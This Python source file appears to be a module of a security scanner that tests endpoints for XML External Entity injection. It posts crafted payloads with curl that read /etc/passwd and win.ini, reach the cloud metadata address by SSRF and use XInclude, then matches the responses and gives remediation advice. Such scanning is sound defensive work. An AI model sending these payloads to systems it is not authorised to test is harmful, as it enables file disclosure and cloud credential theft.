"""
XXE (XML External Entity) Detection tool.

Tests for XXE vulnerabilities by sending crafted XML payloads to
endpoints that accept XML input.
"""

import re
import shutil
from typing import Dict, Any, List

from tools.base_tool import BaseTool


class XXEScannerTool(BaseTool):
    """Detect XML External Entity (XXE) injection vulnerabilities."""

    # XXE test payloads
    XXE_PAYLOADS = {
        "basic_file_read": {
            "payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            "indicators": [r"root:.*?:0:0:", r"/bin/(?:ba)?sh", r"nobody:"],
            "severity": "critical",
            "description": "XXE allows reading arbitrary files from the server filesystem.",
        },
        "basic_file_read_win": {
            "payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
            "indicators": [r"\[fonts\]", r"\[extensions\]", r"for 16-bit app support"],
            "severity": "critical",
            "description": "XXE allows reading arbitrary files from the Windows filesystem.",
        },
        "ssrf_via_xxe": {
            "payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
            "indicators": [r"ami-id", r"instance-id", r"hostname", r"public-keys"],
            "severity": "critical",
            "description": "XXE can be used for SSRF to access cloud metadata and internal services.",
        },
        "parameter_entity": {
            "payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname">%xxe;]><root>test</root>',
            "indicators": [],  # Blind - check for behavioral differences
            "severity": "high",
            "description": "Parameter entity XXE may allow out-of-band data exfiltration.",
        },
        "xinclude": {
            "payload": '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
            "indicators": [r"root:.*?:0:0:", r"/bin/(?:ba)?sh"],
            "severity": "critical",
            "description": "XInclude attack allows including server-side files in non-XML contexts.",
        },
    }

    def __init__(self, config):
        super().__init__(config)
        self.tool_name = "xxe-scanner"

    def _check_installation(self) -> bool:
        return shutil.which("curl") is not None

    def is_success_exit_code(self, exit_code: int) -> bool:
        return exit_code in (0, 22, 28, 35, 52, 56, 60)

    def get_command(self, target: str, **kwargs) -> List[str]:
        """
        Send a basic XXE payload via POST with XML content type.
        """
        payload_name = kwargs.get("payload", "basic_file_read")
        payload_config = self.XXE_PAYLOADS.get(payload_name, self.XXE_PAYLOADS["basic_file_read"])
        xml_payload = payload_config["payload"]
        timeout = kwargs.get("timeout", 10)

        command = [
            "curl", "-sS",
            "-X", "POST",
            "-H", "Content-Type: application/xml",
            "-H", "Accept: application/xml, text/xml, */*",
            "-d", xml_payload,
            "--max-time", str(timeout),
            "--connect-timeout", "5",
            "-A", "Guardian-XXE-Scanner/1.0",
            "-k",
            target,
        ]
        return command

    def parse_output(self, output: str) -> Dict[str, Any]:
        """Analyze response for XXE indicators."""
        results = {
            "vulnerable": False,
            "xxe_types": [],
            "findings": [],
        }

        if not output or not output.strip():
            return results

        for payload_name, config in self.XXE_PAYLOADS.items():
            for indicator_pattern in config["indicators"]:
                if re.search(indicator_pattern, output, re.IGNORECASE):
                    results["vulnerable"] = True
                    if payload_name not in results["xxe_types"]:
                        results["xxe_types"].append(payload_name)
                    results["findings"].append({
                        "title": f"XML External Entity (XXE) Injection - {payload_name.replace('_', ' ').title()}",
                        "severity": config["severity"],
                        "type": "xxe",
                        "xxe_type": payload_name,
                        "description": config["description"],
                        "remediation": "Disable external entity processing in all XML parsers. "
                                      "Use the following settings per language:\n"
                                      "- Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)\n"
                                      "- PHP: libxml_disable_entity_loader(true)\n"
                                      "- Python: defusedxml library\n"
                                      "- .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit\n"
                                      "Consider using JSON instead of XML where possible.",
                    })
                    break  # One match per payload type is enough

        # Check for XML parsing error messages that hint at XXE surface
        xml_error_patterns = [
            (r"(?i)xml.*?pars(?:e|ing).*?error", "XML parsing error detected - endpoint processes XML"),
            (r"(?i)DOCTYPE.*?not allowed", "DTD processing partially restricted - may be bypassable"),
            (r"(?i)entity.*?(?:not allowed|forbidden|disabled)", "Entity processing restricted - good security posture"),
            (r"(?i)SAXParseException|XMLSyntaxError|XmlException", "XML parser exception exposed"),
        ]

        for pattern, desc in xml_error_patterns:
            if re.search(pattern, output):
                if "not allowed" in desc.lower() or "forbidden" in desc.lower() or "restricted" in desc.lower():
                    # This is actually a good sign - protections in place
                    continue
                if not any(f["type"] == "xxe_surface" for f in results["findings"]):
                    results["findings"].append({
                        "title": "XML Processing Endpoint Detected",
                        "severity": "low",
                        "type": "xxe_surface",
                        "description": f"Endpoint accepts and processes XML input. {desc}. "
                                      "Further manual testing for XXE recommended.",
                        "remediation": "Ensure XML parsers have external entity processing disabled. "
                                      "Validate and sanitize all XML input.",
                    })

        return results
